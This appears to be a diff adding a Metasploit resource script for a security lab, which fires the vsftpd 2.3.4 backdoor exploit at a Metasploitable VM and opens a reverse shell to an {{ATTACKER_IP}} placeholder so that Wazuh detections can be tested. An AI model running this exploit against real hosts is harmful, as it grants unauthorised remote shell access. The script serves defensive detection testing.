@@ -1,0 +1,15 @@
+# Scenario: exploit the intentionally-backdoored vsftpd 2.3.4 on
+# Metasploitable2/3. Generates a real exploitation event + reverse shell,
+# useful for testing lateral-movement / new-process detections if the
+# target also runs a Wazuh agent (add one to metasploitable for this test).
+#
+# ONLY run against your own Metasploitable VM. This backdoor exists solely
+# in that intentionally-vulnerable image.
+
+use exploit/unix/ftp/vsftpd_234_backdoor
+set RHOSTS {{TARGET}}
+set LHOST {{ATTACKER_IP}}
+run -j
+sleep 5
+sessions -l
+exit -y
